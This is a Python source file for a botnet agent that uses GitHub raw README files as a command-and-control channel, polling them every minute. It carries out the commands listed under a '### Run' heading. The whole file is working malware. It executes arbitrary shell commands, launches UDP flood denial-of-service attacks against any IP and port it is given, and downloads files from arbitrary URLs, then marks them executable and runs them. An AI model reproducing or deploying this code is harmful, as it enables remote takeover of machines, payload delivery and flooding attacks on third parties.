import asyncio
import aiohttp
import subprocess
import os
import socket
import time

GITHUB_READMES = [
    "https://raw.githubusercontent.com/user/repo1/main/README.md",
    "https://raw.githubusercontent.com/user/repo2/main/README.md",
    # Add more GitHub raw README URLs
]

SUPPORTED_COMMANDS = ["cmd", "dos", "download"]
USER_AGENT = "Mozilla/5.0"

async def fetch_readme(session, url):
    try:
        async with session.get(url, headers={"User-Agent": USER_AGENT}, timeout=10) as resp:
            if resp.status == 200:
                return await resp.text()
    except Exception as e:
        print(f"[!] Failed to fetch {url}: {e}")
    return None

def extract_run_section(readme):
    lines = readme.splitlines()
    run_index = [i for i, l in enumerate(lines) if l.strip().lower() == "### run"]
    if not run_index:
        return []
    start = run_index[0] + 1
    result = []
    for line in lines[start:]:
        if line.strip().startswith("### "):  # Next section
            break
        if line.strip():
            result.append(line.strip())
    return result

async def dos_attack(ip, port, duration):
    end = time.time() + int(duration)
    print(f"[~] Starting UDP flood to {ip}:{port} for {duration} seconds...")
    while time.time() < end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(1024), (ip, int(port)))
        except Exception:
            pass

async def handle_command(command):
    if command.startswith("cmd "):
        cmd = command[4:]
        print(f"[~] Executing command: {cmd}")
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            print(output.decode())
        except subprocess.CalledProcessError as e:
            print(f"[!] Command error: {e.output.decode()}")

    elif command.startswith("dos "):
        try:
            _, ip, port, duration = command.split()
            await dos_attack(ip, port, duration)
        except Exception as e:
            print(f"[!] DOS command error: {e}")

    elif command.startswith("download "):
        parts = command.split()
        if len(parts) < 3:
            print("[!] Invalid download command")
            return
        url, path = parts[1], parts[2]
        flags = parts[3:]
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        with open(path, "wb") as f:
                            f.write(await resp.read())
                        print(f"[+] Downloaded to {path}")
                        if "RUN" in flags:
                            subprocess.Popen(["chmod", "+x", path])
                            subprocess.Popen([path])
                    else:
                        print(f"[!] Failed to download: {url}")
            except Exception as e:
                print(f"[!] Download error: {e}")

async def run_bot():
    while True:
        found = False
        for url in GITHUB_READMES:
            async with aiohttp.ClientSession() as session:
                readme = await fetch_readme(session, url)
                if not readme:
                    continue
                commands = extract_run_section(readme)
                if not commands:
                    continue

                print(f"[+] Fetched commands from: {url}")
                for command in commands:
                    if any(command.startswith(cmd) for cmd in SUPPORTED_COMMANDS):
                        await handle_command(command)
                found = True
                break  # Only process the first valid README

        if not found:
            print("[!] No valid commands found in any README")
        await asyncio.sleep(60)

if __name__ == "__main__":
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n[!] Bot stopped.")
